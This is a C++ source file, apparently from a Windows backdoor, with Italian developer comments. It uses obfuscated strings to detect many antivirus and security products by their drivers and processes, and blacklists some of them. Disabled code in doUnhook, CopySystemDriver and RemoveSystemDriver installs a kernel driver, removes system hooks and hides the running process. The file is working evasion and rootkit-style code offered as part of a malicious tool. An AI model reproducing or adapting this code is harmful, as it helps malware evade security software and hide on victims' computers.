class ScrambleString
{
	public:
	char *get_str()
	{
		if (string)
			return string;
		return "NIL";
	}

	WCHAR *get_wstr()
	{
		return string_w;
	}

	ScrambleString(char *ob_str) 
	{
		string = LOG_ScrambleName(ob_str, 2, FALSE);
		if (string)
			_snwprintf_s(string_w, 64, _TRUNCATE, L"%S", string);		
		else
			_snwprintf_s(string_w, 64, _TRUNCATE, L"NIL");		
	}

	ScrambleString(char *ob_str, BOOL is_demo) 
	{
		string = NULL;
		if (is_demo) {
			string = LOG_ScrambleName(ob_str, 2, FALSE);
			if (string)
				_snwprintf_s(string_w, 64, _TRUNCATE, L"%S", string);		
			else
				_snwprintf_s(string_w, 64, _TRUNCATE, L"NIL");		
		} else
			_snwprintf_s(string_w, 64, _TRUNCATE, L"");		
	}

	~ScrambleString(void)
	{
		SAFE_FREE(string);
	}
	
	private:
	char *string;
	WCHAR string_w[64];
};


BOOL IsDriverRunning(WCHAR *driver_name)
{
	DWORD dummy;
	LPVOID *drivers;
	DWORD cbNeeded = 0;
	int cDrivers, i;

	FNC(EnumDeviceDrivers)((LPVOID *)&dummy, sizeof(dummy), &cbNeeded);
	if (cbNeeded == 0)
		return FALSE;
	if (!(drivers = (LPVOID *)malloc(cbNeeded)))
		return FALSE;

	if( FNC(EnumDeviceDrivers)(drivers, cbNeeded, &dummy) ) { 
		WCHAR szDriver[1024];
		cDrivers = cbNeeded/sizeof(LPVOID);
		for (i=0; i < cDrivers; i++ ) {
			if(FNC(GetDeviceDriverBaseNameW)(drivers[i], szDriver, sizeof(szDriver)/sizeof(szDriver[0]))) { 
				if (!_wcsicmp(szDriver, driver_name)) {
					free(drivers);
					return TRUE;
				}
			}
		}
	}
	free(drivers);
	return FALSE;
}

BOOL IsEndPoint()
{
	WIN32_FIND_DATA fdata;
	char buffer[DLLNAMELEN];
	HANDLE hff;

	ScrambleString ss1("a71itRPv.1J1"); // "wpsdrvnt.sys"
	ScrambleString ss2("1tv17.1J1"); // "srtsp.sys"

	if (IsDriverRunning(ss1.get_wstr()) && IsDriverRunning(ss2.get_wstr()))
		return TRUE;

	ZeroMemory(buffer, sizeof(buffer));
	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
	strcat(buffer, "\\system32\\drivers\\");
	strcat(buffer, ss1.get_str());

	hff = FNC(FindFirstFileA)(buffer, &fdata);
	if (hff == INVALID_HANDLE_VALUE)
		return FALSE;
	FNC(FindClose)(hff);

	ZeroMemory(buffer, sizeof(buffer));
	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
	strcat(buffer, "\\system32\\drivers\\");
	strcat(buffer, ss2.get_str());

	hff = FNC(FindFirstFileA)(buffer, &fdata);
	if (hff == INVALID_HANDLE_VALUE) {
		FNC(FindClose)(hff);
		return FALSE;
	}

	FNC(FindClose)(hff);
	return TRUE;
}

// XXX - Que - Detection 
BOOL IsComodo2()
{
	WIN32_FIND_DATA fdata;
	char buffer[DLLNAMELEN];
	HANDLE hff;

	ScrambleString ss1("UP17lgv.1J1"); // "inspect.sys"
	ScrambleString ss2("goioEP.1J1"); // "cmdmon.sys"

	if (IsDriverRunning(ss1.get_wstr()) && IsDriverRunning(ss2.get_wstr()))
		return TRUE;

	ZeroMemory(buffer, sizeof(buffer));
	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
	strcat(buffer, "\\system32\\drivers\\");
	strcat(buffer, ss1.get_str());

	hff = FNC(FindFirstFileA)(buffer, &fdata);
	if (hff == INVALID_HANDLE_VALUE)
		return FALSE;
	FNC(FindClose)(hff);

	ZeroMemory(buffer, sizeof(buffer));
	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
	strcat(buffer, "\\system32\\drivers\\");
	strcat(buffer, ss2.get_str());

	hff = FNC(FindFirstFileA)(buffer, &fdata);
	if (hff == INVALID_HANDLE_VALUE) {
		FNC(FindClose)(hff);
		return FALSE;
	}

	FNC(FindClose)(hff);
	return TRUE;
}

BOOL IsComodo3()
{
	// XXX - Que - riabilito la funzione 
	//return FALSE;

	WIN32_FIND_DATA fdata;
	char buffer[DLLNAMELEN];
	HANDLE hff;

	ScrambleString ss1("UP17lgv.1J1"); // "inspect.sys"
	ScrambleString ss2("goi0W7.1J1"); // "cmdhlp.sys"

	if (IsDriverRunning(ss1.get_wstr()) && IsDriverRunning(ss2.get_wstr()))
		return TRUE;

	ZeroMemory(buffer, sizeof(buffer));
	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
	strcat(buffer, "\\system32\\drivers\\");
	strcat(buffer, ss1.get_str());

	hff = FNC(FindFirstFileA)(buffer, &fdata);
	if (hff == INVALID_HANDLE_VALUE)
		return FALSE;
	FNC(FindClose)(hff);

	ZeroMemory(buffer, sizeof(buffer));
	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
	strcat(buffer, "\\system32\\drivers\\");
	strcat(buffer, ss2.get_str());

	hff = FNC(FindFirstFileA)(buffer, &fdata);
	if (hff == INVALID_HANDLE_VALUE) 
		return FALSE;
	FNC(FindClose)(hff);

	return TRUE;
}

BOOL IsAshampoo()
{
	WIN32_FIND_DATA fdata;
	char buffer[DLLNAMELEN];
	HANDLE hff;

	ScrambleString ss1("x10xR4g8P.1J1"); // "AshAvScan.sys"
	ScrambleString ss2("xPvU47Jj8tlrNd8ti.lVl"); // "AntiSpyWare2Guard.exe"
	ScrambleString ss3("xPvU47Jj8tlr.lVl"); // "AntiSpyWare2.exe"

	if (IsDriverRunning(ss1.get_wstr()))
		return TRUE;

	ZeroMemory(buffer, sizeof(buffer));
	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
	strcat(buffer, "\\system32\\");
	strcat(buffer, ss1.get_str());
	
	hff = FNC(FindFirstFileA)(buffer, &fdata);
	if (hff != INVALID_HANDLE_VALUE) {
		FNC(FindClose)(hff);
		return TRUE;
	}

	if (HM_FindPid(ss2.get_str(), FALSE))
		return TRUE;
	if (HM_FindPid(ss3.get_str(), FALSE))
		return TRUE;

	return FALSE;
}

BOOL IsADAware()
{
	ScrambleString ss1("xxj4ltRUgl.lVl"); // "AAWService.exe"
	if (HM_FindPid(ss1.get_str(), FALSE))
		return TRUE;
	return FALSE;
}

BOOL IsSophos32()
{
	ScrambleString ss1("18REP8ggl11.1J1"); // "savonaccess.sys"

	if (!IsX64System() && IsDriverRunning(ss1.get_wstr()))
		return TRUE;
	return FALSE;
}

BOOL IsDeepFreeze()
{
	WIN32_FIND_DATA fdata;
	char buffer[DLLNAMELEN];
	HANDLE hff;

	ScrambleString ss1("fll7TtA.1J1"); // "DeepFrz.sys"

	if (IsDriverRunning(ss1.get_wstr()))
		return TRUE;

	ZeroMemory(buffer, sizeof(buffer));
	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
	strcat(buffer, "\\system32\\drivers\\");
	strcat(buffer, ss1.get_str());
	
	hff = FNC(FindFirstFileA)(buffer, &fdata);
	if (hff == INVALID_HANDLE_VALUE)
		return FALSE;
	FNC(FindClose)(hff);
	return TRUE;
}

BOOL IsAvira()
{
	WIN32_FIND_DATA fdata;
	char buffer[DLLNAMELEN];
	HANDLE hff;

	ScrambleString ss1("8RCPvoCt.1J1"); // "avgntmgr.sys"
	ScrambleString ss2("8RCPvii.1J1"); // "avgntdd.sys"

	if (IsDriverRunning(ss1.get_wstr()) || IsDriverRunning(ss2.get_wstr()))
		return TRUE;

	ZeroMemory(buffer, sizeof(buffer));
	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
	strcat(buffer, "\\system32\\drivers\\");
	strcat(buffer, ss1.get_str());

	hff = FNC(FindFirstFileA)(buffer, &fdata);
	if (hff != INVALID_HANDLE_VALUE) {
		FNC(FindClose)(hff);
		return TRUE;
	}

	ZeroMemory(buffer, sizeof(buffer));
	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
	strcat(buffer, "\\system32\\drivers\\");
	strcat(buffer, ss2.get_str());

	hff = FNC(FindFirstFileA)(buffer, &fdata);
	if (hff != INVALID_HANDLE_VALUE) {
		FNC(FindClose)(hff);
		return TRUE;
	}

	return FALSE;
}

BOOL IsPCTools()
{
	WIN32_FIND_DATA fdata;
	char buffer[DLLNAMELEN];
	HANDLE hff;

	ScrambleString ss1("cBKx77LRlPv.1J1"); // "PCTAppEvent.sys"

	if (IsDriverRunning(ss1.get_wstr()))
		return TRUE;

	ZeroMemory(buffer, sizeof(buffer));
	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
	strcat(buffer, "\\system32\\drivers\\");
	strcat(buffer, ss1.get_str());
	
	hff = FNC(FindFirstFileA)(buffer, &fdata);
	if (hff == INVALID_HANDLE_VALUE)
		return FALSE;
	FNC(FindClose)(hff);
	return TRUE;
}

BOOL IsBitDefender()
{
	WIN32_FIND_DATA fdata;
	char buffer[DLLNAMELEN];
	HANDLE hff;

	ScrambleString ss1("wfFX.1J1"); // "BDHV.sys"

	if (IsX64System() && IsDriverRunning(ss1.get_wstr()))
		return TRUE;

	ZeroMemory(buffer, sizeof(buffer));
	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
	strcat(buffer, "\\system32\\drivers\\");
	strcat(buffer, ss1.get_str());
	
	hff = FNC(FindFirstFileA)(buffer, &fdata);
	if (hff == INVALID_HANDLE_VALUE)
		return FALSE;
	FNC(FindClose)(hff);
	return TRUE;
}

BOOL IsBitDefenderAVPlus()
{
	WIN32_FIND_DATA fdata;
	char buffer[DLLNAMELEN];
	HANDLE hff;

	ScrambleString ss1("8Rgp.1J1"); // "avc3.sys"
	ScrambleString ss2("8Rgp.1J1"); // "avc3.sys"

	if (IsDriverRunning(ss1.get_wstr()) && IsDriverRunning(ss2.get_wstr()))
		return TRUE;

	ZeroMemory(buffer, sizeof(buffer));
	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
	strcat(buffer, "\\system32\\drivers\\");
	strcat(buffer, ss1.get_str());

	hff = FNC(FindFirstFileA)(buffer, &fdata);
	if (hff == INVALID_HANDLE_VALUE)
		return FALSE;
	FNC(FindClose)(hff);

	ZeroMemory(buffer, sizeof(buffer));
	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
	strcat(buffer, "\\system32\\drivers\\");
	strcat(buffer, ss2.get_str());

	hff = FNC(FindFirstFileA)(buffer, &fdata);
	if (hff == INVALID_HANDLE_VALUE) 
		return FALSE;
	FNC(FindClose)(hff);

	return TRUE;
}

BOOL IsBlink()
{
	WIN32_FIND_DATA fdata;
	char buffer[DLLNAMELEN];
	HANDLE hff;

	ScrambleString ss1("llJl0.1J1"); // "eeyeh.sys"

	if (IsDriverRunning(ss1.get_wstr()))
		return TRUE;

	ZeroMemory(buffer, sizeof(buffer));
	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
	strcat(buffer, "\\system32\\drivers\\");
	strcat(buffer, ss1.get_str());
	
	hff = FNC(FindFirstFileA)(buffer, &fdata);
	if (hff == INVALID_HANDLE_VALUE)
		return FALSE;
	FNC(FindClose)(hff);
	return TRUE;
}

BOOL IsSunBeltPF()
{
	WIN32_FIND_DATA fdata;
	char buffer[DLLNAMELEN];
	HANDLE hff;

	ScrambleString ss1("4ITa.1J1"); // "SbFw.sys"

	if (IsDriverRunning(ss1.get_wstr()))
		return TRUE;

	ZeroMemory(buffer, sizeof(buffer));
	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
	strcat(buffer, "\\system32\\drivers\\");
	strcat(buffer, ss1.get_str());
	
	hff = FNC(FindFirstFileA)(buffer, &fdata);
	if (hff == INVALID_HANDLE_VALUE)
		return FALSE;
	FNC(FindClose)(hff);
	return TRUE;
}


BOOL IsRising()
{
	WIN32_FIND_DATA fdata;
	char buffer[DLLNAMELEN];
	HANDLE hff;

	ScrambleString ss1("tzaI81l.1J1"); // "rfwbase.sys"
	ScrambleString ss2("FEED4J1.1J1"); // "HookSys.sys"

	if (IsDriverRunning(ss1.get_wstr()) || IsDriverRunning(ss2.get_wstr()))
		return TRUE;

	ZeroMemory(buffer, sizeof(buffer));
	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
	strcat(buffer, "\\system32\\drivers\\");
	strcat(buffer, ss1.get_str());

	hff = FNC(FindFirstFileA)(buffer, &fdata);
	if (hff != INVALID_HANDLE_VALUE) {
		FNC(FindClose)(hff);
		return TRUE;
	}

	ZeroMemory(buffer, sizeof(buffer));
	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
	strcat(buffer, "\\system32\\drivers\\");
	strcat(buffer, ss2.get_str());

	hff = FNC(FindFirstFileA)(buffer, &fdata);
	if (hff != INVALID_HANDLE_VALUE) {
		FNC(FindClose)(hff);
		return TRUE;
	}

	return FALSE;
}


BOOL IsZoneAlarm()
{
	WIN32_FIND_DATA fdata;
	char buffer[DLLNAMELEN];
	HANDLE hff;

	ScrambleString ss1("R1i8v8Pv.1J1"); // "vsdatant.sys"

	if (IsDriverRunning(ss1.get_wstr()))
		return TRUE;

	ZeroMemory(buffer, sizeof(buffer));
	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
	strcat(buffer, "\\system32\\");
	strcat(buffer, ss1.get_str());

	hff = FNC(FindFirstFileA)(buffer, &fdata);
	if (hff != INVALID_HANDLE_VALUE) {
		FNC(FindClose)(hff);
		return TRUE;
	}

	ZeroMemory(buffer, sizeof(buffer));
	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
	strcat(buffer, "\\system32\\drivers\\");
	strcat(buffer, ss1.get_str());

	hff = FNC(FindFirstFileA)(buffer, &fdata);
	if (hff != INVALID_HANDLE_VALUE) {
		FNC(FindClose)(hff);
		return TRUE;
	}

	return FALSE;
}

BOOL IsMcAfee()
{
	ScrambleString ss1("og1J1oEP.lVl"); // "mcsysmon.exe"

	if (HM_FindPid(ss1.get_str(), FALSE))
		return TRUE;
	return FALSE;
}

BOOL IsPGuard()
{
	WIN32_FIND_DATA fdata;
	char buffer[DLLNAMELEN];
	HANDLE hff;

	ScrambleString ss1("7tEgCd8ti.1J1"); // "procguard.sys"

	if (IsDriverRunning(ss1.get_wstr()))
		return TRUE;

	ZeroMemory(buffer, sizeof(buffer));
	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
	strcat(buffer, "\\system32\\drivers\\");
	strcat(buffer, ss1.get_str());
	
	hff = FNC(FindFirstFileA)(buffer, &fdata);
	if (hff == INVALID_HANDLE_VALUE)
		return FALSE;
	FNC(FindClose)(hff);
	return TRUE;
}


BOOL IsTrend()
{
	WIN32_FIND_DATA fdata;
	char buffer[DLLNAMELEN];
	HANDLE hff;

	ScrambleString ss1("vogEoo.1J1"); // "tmcomm.sys"

	if (IsDriverRunning(ss1.get_wstr()))
		return TRUE;

	ZeroMemory(buffer, sizeof(buffer));
	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
	strcat(buffer, "\\system32\\drivers\\");
	strcat(buffer, ss1.get_str());
	
	hff = FNC(FindFirstFileA)(buffer, &fdata);
	if (hff == INVALID_HANDLE_VALUE)
		return FALSE;
	FNC(FindClose)(hff);
	return TRUE;
}

BOOL IsPanda64()
{
	WIN32_FIND_DATA fdata;
	char buffer[DLLNAMELEN];
	HANDLE hff;

	ScrambleString ss1("78RIEEvGu.1J1"); // "pavboot64.sys"

	if (IsDriverRunning(ss1.get_wstr()))
		return TRUE;

	ZeroMemory(buffer, sizeof(buffer));
	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
	strcat(buffer, "\\system32\\drivers\\");
	strcat(buffer, ss1.get_str());

	hff = FNC(FindFirstFileA)(buffer, &fdata);
	if (hff == INVALID_HANDLE_VALUE)
		return FALSE;
	FNC(FindClose)(hff);
	return TRUE;
}

BOOL IsPanda()
{
	WIN32_FIND_DATA fdata;
	char buffer[DLLNAMELEN];
	HANDLE hff;

	ScrambleString ss1("78R7tEg.1J1"); // "pavproc.sys"

	if (IsDriverRunning(ss1.get_wstr()))
		return TRUE;

	ZeroMemory(buffer, sizeof(buffer));
	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
	strcat(buffer, "\\system32\\drivers\\");
	strcat(buffer, ss1.get_str());
	
	hff = FNC(FindFirstFileA)(buffer, &fdata);
	if (hff == INVALID_HANDLE_VALUE)
		return FALSE;
	FNC(FindClose)(hff);
	return TRUE;
}

BOOL IsAVG()
{
	WIN32_FIND_DATA fdata;
	char buffer[DLLNAMELEN];
	HANDLE hff;

	ScrambleString ss1("xXNyf4LtFt.1J1"); // "AVGIDSErHr.sys"
	ScrambleString ss2("xXNyf4xClPv.lVl"); // "AVGIDSAgent.exe"

	if (IsDriverRunning(ss1.get_wstr()))
		return TRUE;

	ZeroMemory(buffer, sizeof(buffer));
	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
	strcat(buffer, "\\system32\\drivers\\");
	strcat(buffer, ss1.get_str());
	
	hff = FNC(FindFirstFileA)(buffer, &fdata);
	if (hff != INVALID_HANDLE_VALUE) {
		FNC(FindClose)(hff);
		return TRUE;
	}

	if (HM_FindPid(ss2.get_str(), FALSE))
		return TRUE;

	return FALSE;
}

BOOL IsAVG_IS()
{
	WIN32_FIND_DATA fdata;
	char buffer[DLLNAMELEN];
	HANDLE hff;

	ScrambleString ss1("xXNyf4VV.1J1"); // "AVGIDSxx.sys"
	ScrambleString ss2("xXNyf4xClPv.lVl"); // "AVGIDSAgent.exe"

	if (IsDriverRunning(ss1.get_wstr()))
		return TRUE;

	ZeroMemory(buffer, sizeof(buffer));
	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
	strcat(buffer, "\\system32\\drivers\\");
	strcat(buffer, ss1.get_str());
	
	hff = FNC(FindFirstFileA)(buffer, &fdata);
	if (hff != INVALID_HANDLE_VALUE) {
		FNC(FindClose)(hff);
		return TRUE;
	}

	if (HM_FindPid(ss2.get_str(), FALSE))
		return TRUE;

	return FALSE;
}

BOOL IsFSecure()
{
	WIN32_FIND_DATA fdata;
	char buffer[DLLNAMELEN];
	HANDLE hff;

	ScrambleString ss1("z1iza.1J1"); // "fsdfw.sys"

	if (IsDriverRunning(ss1.get_wstr()))
		return TRUE;

	ZeroMemory(buffer, sizeof(buffer));
	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
	strcat(buffer, "\\system32\\drivers\\");
	strcat(buffer, ss1.get_str());
	
	hff = FNC(FindFirstFileA)(buffer, &fdata);
	if (hff == INVALID_HANDLE_VALUE)
		return FALSE;
	FNC(FindClose)(hff);
	return TRUE;
}

BOOL IsAvast()
{
	ScrambleString ss1("81a4c.1J1"); // "aswSP.sys"
	ScrambleString ss2("81aT1wWD.1J1"); // "aswFsBlk.sys"

	if (IsDriverRunning(ss1.get_wstr()) || IsDriverRunning(ss2.get_wstr()))
		return TRUE;

	return FALSE;
}

BOOL IsNortonInternetSecurity()
{
	ScrambleString ss1("gg4RgF1v.lVl"); // "ccSvcHst.exe"
	if (HM_FindPid(ss1.get_str(), FALSE))
		return TRUE;
	return FALSE;
}

BOOL IsKaspersky()
{
	WIN32_FIND_DATA fdata;
	char buffer[DLLNAMELEN];
	HANDLE hff;

	ScrambleString ss1("DWUz.1J1"); // "klif.sys"
	ScrambleString ss2("DW3.1J1"); // "kl1.sys"

	if (IsDriverRunning(ss1.get_wstr()) && IsDriverRunning(ss2.get_wstr()))
		return TRUE;

	ZeroMemory(buffer, sizeof(buffer));
	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
	strcat(buffer, "\\system32\\drivers\\");
	strcat(buffer, ss1.get_str());
	
	hff = FNC(FindFirstFileA)(buffer, &fdata);
	if (hff == INVALID_HANDLE_VALUE)
		return FALSE;
	FNC(FindClose)(hff);
	
	ZeroMemory(buffer, sizeof(buffer));
	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
	strcat(buffer, "\\system32\\drivers\\");
	strcat(buffer, ss2.get_str());

	hff = FNC(FindFirstFileA)(buffer, &fdata);
	if (hff == INVALID_HANDLE_VALUE) 
		return FALSE;
	FNC(FindClose)(hff);

	return TRUE;
}

BOOL IsKerio()
{
	WIN32_FIND_DATA fdata;
	char buffer[DLLNAMELEN];
	HANDLE hff;

	ScrambleString ss1("zaitR.1J1"); // "fwdrv.sys"
	ScrambleString ss2("D0U71.1J1"); // "khips.sys"

	if (IsDriverRunning(ss1.get_wstr()) && IsDriverRunning(ss2.get_wstr()))
		return TRUE;

	ZeroMemory(buffer, sizeof(buffer));
	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
	strcat(buffer, "\\system32\\drivers\\");
	strcat(buffer, ss1.get_str());

	hff = FNC(FindFirstFileA)(buffer, &fdata);
	if (hff == INVALID_HANDLE_VALUE)
		return FALSE;
	FNC(FindClose)(hff);
	
	ZeroMemory(buffer, sizeof(buffer));
	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
	strcat(buffer, "\\system32\\drivers\\");
	strcat(buffer, ss2.get_str());

	hff = FNC(FindFirstFileA)(buffer, &fdata);
	if (hff == INVALID_HANDLE_VALUE) 
		return FALSE;
	FNC(FindClose)(hff);

	return TRUE;
}

BOOL CopySystemDriver(WCHAR *drv_path)
{
	char sys_path[DLLNAMELEN];
	char temp_path[DLLNAMELEN];
	char comp_path[DLLNAMELEN*2];
	char *drv_scramb_name;
	PVOID old_value;
/*	
	if (!FNC(GetEnvironmentVariableA)("SystemRoot", sys_path, sizeof(sys_path)))
		return FALSE;
	
	drv_scramb_name = H4DRIVER_NAME;

	old_value = DisableWow64Fs();

	if (IsKaspersky()) {
		sprintf(comp_path, "%s%s%s", sys_path, "\\", DRIVER_NAME);
		FNC(MoveFileExA)(HM_CompletePath(drv_scramb_name, temp_path), comp_path, MOVEFILE_WRITE_THROUGH);
	} else if (!IsComodo2() && !IsComodo3() && !IsAVG()) {
		sprintf(comp_path, "%s%s%s", sys_path, "\\system32\\drivers\\", DRIVER_NAME);
		FNC(MoveFileExA)(HM_CompletePath(drv_scramb_name, temp_path), comp_path, MOVEFILE_WRITE_THROUGH);
	} else // Comodo non permette di scrivere in system32
		FNC(MoveFileExA)(HM_CompletePath(drv_scramb_name, temp_path), HM_CompletePath(DRIVER_NAME, comp_path), MOVEFILE_WRITE_THROUGH);

	RevertWow64Fs(old_value);

	HM_A2U(comp_path, (char *)drv_path);*/
	return TRUE;
}

BOOL RemoveSystemDriver()
{
	char sys_path[DLLNAMELEN];
	char comp_path[DLLNAMELEN*2];
	PVOID old_value;
/*	
	if (!FNC(GetEnvironmentVariableA)("SystemRoot", sys_path, sizeof(sys_path)))
		return FALSE;
	
	old_value = DisableWow64Fs();

	if (IsKaspersky()) {
		sprintf(comp_path, "%s%s%s", sys_path, "\\", DRIVER_NAME);
		FNC(MoveFileExA)(comp_path, 0, MOVEFILE_DELAY_UNTIL_REBOOT);
	} else if (!IsComodo2() && !IsComodo3() && !IsAVG()) {
		sprintf(comp_path, "%s%s%s", sys_path, "\\system32\\drivers\\", DRIVER_NAME);
		FNC(MoveFileExA)(comp_path, 0, MOVEFILE_DELAY_UNTIL_REBOOT);
	} else // Comodo non permette di scrivere in system32
		FNC(MoveFileExA)(HM_CompletePath(DRIVER_NAME, comp_path), 0, MOVEFILE_DELAY_UNTIL_REBOOT);

	RevertWow64Fs(old_value);
	*/
	return TRUE;
}

BOOL IsGData()
{
	WIN32_FIND_DATA fdata;
	char buffer[DLLNAMELEN];
	HANDLE hff;
	
	ScrambleString ss1("Nfwl08Rl.1J1"); // GDBehave.sys

	if (IsDriverRunning(ss1.get_wstr()))
		return TRUE;

	ZeroMemory(buffer, sizeof(buffer));
	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
	strcat(buffer, "\\system32\\drivers\\");
	strcat(buffer, ss1.get_str());
	
	hff = FNC(FindFirstFileA)(buffer, &fdata);
	if (hff == INVALID_HANDLE_VALUE)
		return FALSE;
	FNC(FindClose)(hff);

	return TRUE;
}

BOOL IsBlackList()
{
	if (/*IsGData() || */IsBitDefenderAVPlus() || IsComodo3() || (IsKaspersky() && !IsX64System()))
		return TRUE;
	return FALSE;
}

BOOL doUnhook()
{
#if 0
	DWORD dummy;

	HideDevice dev_unhook;
	// Se il driver è già installato (dal dropper o offline) 
	// fa tutto ciò che serve
	if (IsVista(&dummy))
		dev_unhook.unhook_getadmin();
	if (!IsAvast() && !IsKaspersky())
		dev_unhook.unhook_all(FALSE);
	dev_unhook.unhook_func("ZwSetValueKey", TRUE);
	dev_unhook.unhook_hidepid(FNC(GetCurrentProcessId)(), TRUE);

	// Se siamo su XP con Kaspersky o McAfee o Kerio
	// e non c'e' il driver, allora prova l'installazione
	if ((IsAvira() || IsBlink() || IsPGuard() || /*IsKaspersky() ||*/ IsMcAfee() || IsKerio() || IsComodo2() || IsComodo3() || IsPanda() || /*IsTrend() ||*/ IsAshampoo() || IsEndPoint()) && !IsVista(&dummy) && (!dev_unhook.unhook_isdrv(DRIVER_NAME_W) && !dev_unhook.unhook_isdrv(DRIVER_NAME_OLD_W))) {
		WCHAR drv_path[DLLNAMELEN*2];
		
		// Copia il driver nella directory di destinazione dalla TMP (solo online)
		// in ogni caso torna il path di dove si dovrebbe trovare
		if (!CopySystemDriver(drv_path))
			return FALSE;
		
		HideDevice dev_unhook(drv_path);
		Sleep(500); //sleep paranoico
		// se non ci riesce non lancia la backdoor
		//if (!dev_unhook.unhook_isdrv(DRIVER_NAME_W))
			//return FALSE;

		if (!IsAvast())
			dev_unhook.unhook_all(FALSE);
		dev_unhook.unhook_func("ZwSetValueKey", TRUE);
		dev_unhook.unhook_hidepid(FNC(GetCurrentProcessId)(), TRUE);
	}
#endif
	return TRUE;
}